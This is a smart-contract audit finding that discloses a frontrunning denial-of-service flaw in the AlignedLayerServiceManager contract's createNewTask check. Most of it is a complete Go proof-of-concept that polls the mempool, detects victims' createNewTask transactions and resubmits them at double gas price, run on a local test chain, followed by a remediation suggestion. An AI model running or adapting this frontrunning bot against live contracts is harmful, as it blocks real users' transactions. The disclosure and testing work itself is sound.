# An Aligned user can be frontrun when creating a task leading to a user DoS

**Author(s):** Mohammed Benhelli [@Fuzzinglabs](https://github.com/FuzzingLabs/)

**Date:** 01/08/2024

### **Executive summary**

During the process of auditing the code and developing fuzzing harnesses, we identified a method vulnerable to DoS
in the `AlignedLayerServiceManager.createNewTask` contract. The vulnerability allows an attacker to frontrun a user when
creating a task, leading to a user DoS.

### Vulnerability Details

- **Severity:** Medium
- **Affected Component:** `AlignedLayerServiceManager` contract.


## Environment

- **Distro Version:** Ubuntu 22.04.4 LTS
- **Additional Environment Details:** go version go1.22.5 linux/amd64

### Root Cause Analysis

This vulnerability is possible because the `createNewTask` function check if the `batchesState[batchMerkleRoot]` is
not initialized. A malicious user can frontrun a user by creating a task with the same `batchMerkleRoot` as the user
and setting the `batchesState[batchMerkleRoot]` to `true`. This will cause the targeted user's `createNewTask` to fail.

```solidity
...
contract AlignedLayerServiceManager is
    ...
{
    ...
    function createNewTask(
        bytes32 batchMerkleRoot,
        string calldata batchDataPointer
    ) external payable {
        // ! Check if the batch was already submitted
        require(
            batchesState[batchMerkleRoot].taskCreatedBlock == 0,
            "Batch was already submitted"
        );
        ...
    }
}

```
### Reproducer

1. Start an anvil node
    ```shell
    make anvil_start_with_block_time
    ```
2. Create a file with the following content
    ```go
    package frontrunning_test
    
    import (
        "context"
        "crypto/ecdsa"
        "github.com/ethereum/go-ethereum/accounts/abi/bind"
        "github.com/ethereum/go-ethereum/common"
        "github.com/ethereum/go-ethereum/common/hexutil"
        gethtypes "github.com/ethereum/go-ethereum/core/types"
        "github.com/ethereum/go-ethereum/crypto"
        "github.com/ethereum/go-ethereum/ethclient"
        "github.com/ethereum/go-ethereum/params"
        contractAlignedLayerServiceManager "github.com/yetanotherco/aligned_layer/contracts/bindings/AlignedLayerServiceManager"
        "math/big"
        "sync"
        "testing"
        "time"
    )
    
    type AlignedUser struct {
        Signer      gethtypes.Signer
        Client      *ethclient.Client
        PrivateKey  *ecdsa.PrivateKey
        UserAddress common.Address
        Name        string
    }
    
    func NewAlignedUser(t *testing.T, privateKey []byte, client *ethclient.Client, addr common.Address, name string) *AlignedUser {
        key, err := crypto.ToECDSA(privateKey)
        if err != nil {
            t.Fatalf("could not create private key: %s", err)
        }
        return &AlignedUser{
            Signer:      gethtypes.NewCancunSigner(big.NewInt(31337)),
            Client:      client,
            PrivateKey:  key,
            UserAddress: addr,
            Name:        name,
        }
    }
    
    func (u *AlignedUser) SendTransaction(tx *gethtypes.Transaction) error {
        signedTx, err := gethtypes.SignTx(tx, u.Signer, u.PrivateKey)
        if err != nil {
            return err
        }
        return u.Client.SendTransaction(context.TODO(), signedTx)
    }
    
    func (u *AlignedUser) getNonce() *big.Int {
        nonce, err := u.Client.NonceAt(context.Background(), u.UserAddress, nil)
        if err != nil {
            panic(err)
        }
        return new(big.Int).SetUint64(nonce)
    }
    
    type RPCTransaction struct {
        BlockHash           *common.Hash    `json:"blockHash"`
        BlockNumber         *hexutil.Big    `json:"blockNumber"`
        From                common.Address  `json:"from"`
        Gas                 hexutil.Uint64  `json:"gas"`
        GasPrice            *hexutil.Big    `json:"gasPrice"`
        GasFeeCap           *hexutil.Big    `json:"maxFeePerGas,omitempty"`
        GasTipCap           *hexutil.Big    `json:"maxPriorityFeePerGas,omitempty"`
        MaxFeePerBlobGas    *hexutil.Big    `json:"maxFeePerBlobGas,omitempty"`
        Hash                common.Hash     `json:"hash"`
        Input               hexutil.Bytes   `json:"input"`
        Nonce               hexutil.Uint64  `json:"nonce"`
        To                  *common.Address `json:"to"`
        TransactionIndex    *hexutil.Uint64 `json:"transactionIndex"`
        Value               *hexutil.Big    `json:"value"`
        Type                hexutil.Uint64  `json:"type"`
        ChainID             *hexutil.Big    `json:"chainId,omitempty"`
        BlobVersionedHashes []common.Hash   `json:"blobVersionedHashes,omitempty"`
        V                   *hexutil.Big    `json:"v"`
        R                   *hexutil.Big    `json:"r"`
        S                   *hexutil.Big    `json:"s"`
        YParity             *hexutil.Uint64 `json:"yParity,omitempty"`
    }
    
    func (t RPCTransaction) GetMerkleRootAndDataPointer() ([32]byte, string) {
        merkleRoot := [32]byte{}
        copy(merkleRoot[:], t.Input[4:36])
        dataPointer := string(t.Input[36:])
        return merkleRoot, dataPointer
    }
    
    func (t RPCTransaction) IsCreateNewTaskTransaction(address common.Address) bool {
        return t.To != nil && t.To.String() == address.String() && len(t.Input) > 36 && t.Input[:4].String() == "0x5c008994"
    }
    
    func NewAnvilClient(t *testing.T) *ethclient.Client {
        client, err := ethclient.Dial("http://localhost:8545")
        if err != nil {
            t.Fatalf("could not connect to anvil: %s", err)
        }
        return client
    }
    
    var (
        alicePrivateKey = func() []byte {
            key, err := hexutil.Decode("0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80")
            if err != nil {
                panic(err)
            }
            return key
        }()
        aliceAddress = func() common.Address {
            addr, err := common.NewMixedcaseAddressFromString("0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266")
            if err != nil {
                panic(err)
            }
            return addr.Address()
        }()
        bobPrivateKey = func() []byte {
            key, err := hexutil.Decode("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d")
            if err != nil {
                panic(err)
            }
            return key
        }()
        bobAddress = func() common.Address {
            addr, err := common.NewMixedcaseAddressFromString("0x70997970C51812dc3A010C7d01b50e0d17dc79C8")
            if err != nil {
                panic(err)
            }
            return addr.Address()
        }()
        alignedLayerServiceManagerAddress = func() common.Address {
            addr, err := common.NewMixedcaseAddressFromString("0x809d550fca64d94bd9f66e60752a544199cfac3d")
            if err != nil {
                panic(err)
            }
            return addr.Address()
        }()
    )
    
    func CreateNewTask(t *testing.T, user *AlignedUser, contractAddress common.Address, merkleRoot [32]byte, dataPointer string) {
        serviceManager, err := contractAlignedLayerServiceManager.NewContractAlignedLayerServiceManager(
            contractAddress,
            user.Client,
        )
        if err != nil {
            t.Fatalf("could not create service manager: %s", err)
        }
    
        createTx, err := serviceManager.CreateNewTask(
            &bind.TransactOpts{
                From:  user.UserAddress,
                Nonce: user.getNonce(),
                Signer: func(addr common.Address, tx *gethtypes.Transaction) (*gethtypes.Transaction, error) {
                    return gethtypes.SignTx(tx, user.Signer, user.PrivateKey)
                },
                Value:    new(big.Int).SetUint64(1),
                GasLimit: params.GenesisGasLimit / 2,
            },
            merkleRoot,
            dataPointer,
        )
        if err != nil {
            t.Fatalf("could not create task: %s", err)
        }
    
        i := 0
        r := new(gethtypes.Receipt)
        for {
            r, err = user.Client.TransactionReceipt(context.TODO(), createTx.Hash())
            if i > 10 {
                return
            }
            i++
            if err != nil {
                if err.Error() != "not found" {
                    t.Fatal(err)
                }
                time.Sleep(1 * time.Second)
                continue
            }
            if r.Status != 0 {
                break
            }
            time.Sleep(1 * time.Second)
        }
    
    }
    
    func FrontrunNewTask(t *testing.T, user *AlignedUser, contractAddress common.Address, tx RPCTransaction) {
        merkleRoot, dataPointer := tx.GetMerkleRootAndDataPointer()
        serviceManager, err := contractAlignedLayerServiceManager.NewContractAlignedLayerServiceManager(
            contractAddress,
            user.Client,
        )
        if err != nil {
            t.Fatalf("could not create service manager: %s", err)
        }
    
        createTx, err := serviceManager.CreateNewTask(
            &bind.TransactOpts{
                From:  user.UserAddress,
                Nonce: user.getNonce(),
                Signer: func(addr common.Address, tx *gethtypes.Transaction) (*gethtypes.Transaction, error) {
                    return gethtypes.SignTx(tx, user.Signer, user.PrivateKey)
                },
                Value:    new(big.Int).SetUint64(1),
                GasLimit: params.GenesisGasLimit,
                GasPrice: new(big.Int).Mul(tx.GasPrice.ToInt(), big.NewInt(2)),
            },
            merkleRoot,
            dataPointer,
        )
        if err != nil {
            t.Fatalf("could not create task: %s", err)
        }
    
        r := new(gethtypes.Receipt)
        for {
            r, err = user.Client.TransactionReceipt(context.TODO(), createTx.Hash())
            if err != nil {
                if err.Error() != "not found" {
                    t.Fatal(err)
                }
                time.Sleep(1 * time.Second)
                continue
            }
            if r.Status != 0 {
                break
            }
            time.Sleep(1 * time.Second)
        }
    
        t.Fatalf("The frontruning transaction was successful: %v", r)
    }
    
    func FilterPendingTransactions(t *testing.T, user *AlignedUser, contractAddress common.Address, txs map[string]*RPCTransaction) {
        for _, tx := range txs {
            if tx.IsCreateNewTaskTransaction(contractAddress) {
                t.Logf("frontrunning tx: %v", tx)
                FrontrunNewTask(t, user, contractAddress, *tx)
                return
            }
        }
    }
    
    func ListenAndFrontrun(t *testing.T, user *AlignedUser, contractAddress common.Address) {
        result := new(map[string]map[string]map[string]*RPCTransaction)
        for {
            // ? https://geth.ethereum.org/docs/interacting-with-geth/rpc/ns-txpool
            if err := user.Client.Client().Call(result, "txpool_content"); err != nil {
                t.Fatalf("could not call client: %s", err)
            }
            time.Sleep(100 * time.Millisecond)
            if len((*result)["pending"]) != 0 {
                for _, txs := range (*result)["pending"] {
                    FilterPendingTransactions(t, user, contractAddress, txs)
                }
            }
        }
    }
    
    func TestFrontrunAlignedLayerServiceManagerCreateNewTask(t *testing.T) {
        client := NewAnvilClient(t)
        alice := NewAlignedUser(t, alicePrivateKey, client, aliceAddress, "alice")
        bob := NewAlignedUser(t, bobPrivateKey, client, bobAddress, "bob")
        testCases := []struct {
            merkleRoot  [32]byte
            dataPointer string
            alignedUser *AlignedUser
        }{
            {
                merkleRoot:  [32]byte{0x01},
                dataPointer: "0x01",
                alignedUser: alice,
            },
        }
    
        for _, tc := range testCases {
            wg := new(sync.WaitGroup)
            wg.Add(1)
            go func() {
                defer wg.Done()
                ListenAndFrontrun(t, bob, alignedLayerServiceManagerAddress)
            }()
            time.Sleep(2 * time.Second)
            CreateNewTask(t, tc.alignedUser, alignedLayerServiceManagerAddress, tc.merkleRoot, tc.dataPointer)
            wg.Wait()
        }
    }
    ```
3. Run the test
    ```shell
    go test github.com/yetanotherco/aligned_layer/fuzzinglabs/frontrunning
    ```

### Remediation

Frontrun is a difficult issue to handle. 
One possible way in this case would be to store the `batchesState[batchMerkleRoot]` in a mapping with the user address
as the key. Or using the `batchDataPointer` and `batchMerkleRoot` as a key in a mapping to store the state of the batch.
This way, someone front-running the user would only validate the batch.